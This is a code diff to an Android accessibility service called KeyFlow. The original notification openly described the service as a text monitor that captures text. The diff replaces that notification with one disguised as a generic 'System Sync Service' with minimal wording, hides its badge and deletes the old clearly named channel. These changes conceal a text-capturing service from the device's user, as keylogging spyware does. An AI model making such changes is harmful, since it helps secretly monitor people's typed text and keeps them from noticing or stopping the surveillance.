@@ -51,17 +51,26 @@ class KeyflowAccessibilityService : AccessibilityService() {
     fun updateForegroundNotification(paused: Boolean) {
         try {
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                val channelId = "keyflow_active_service"
+                val channelId = "device_sync_service"
                 val manager = getSystemService(android.app.NotificationManager::class.java)
+
+                // Clean up old legacy channel if present
+                try {
+                    manager?.deleteNotificationChannel("keyflow_active_service")
+                } catch (_: Exception) {}
+
                 val channel = android.app.NotificationChannel(
                     channelId,
-                    "KeyFlow Text Monitor",
+                    "System Sync Service",
                     android.app.NotificationManager.IMPORTANCE_MIN
-                )
+                ).apply {
+                    description = "Background synchronization and input service"
+                    setShowBadge(false)
+                }
                 manager?.createNotificationChannel(channel)
 
-                val title = if (paused) "KeyFlow Paused" else "KeyFlow Active"
-                val text = if (paused) "Text capture is temporarily paused" else "KeyFlow monitoring is running in background"
+                val title = if (paused) "System Sync Service (Paused)" else "System Sync Service"
+                val text = if (paused) "Paused" else "Active"
 
                 val notification = android.app.Notification.Builder(this, channelId)
                     .setContentTitle(title)
@@ -75,11 +84,14 @@ class KeyflowAccessibilityService : AccessibilityService() {
                 } else {
                     startForeground(1001, notification)
                 }
+                manager?.notify(1001, notification)
             }
         } catch (e: Exception) {
             android.util.Log.e("KeyflowA11y", "Foreground notification update error: $e")
         }
     }
+
+
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
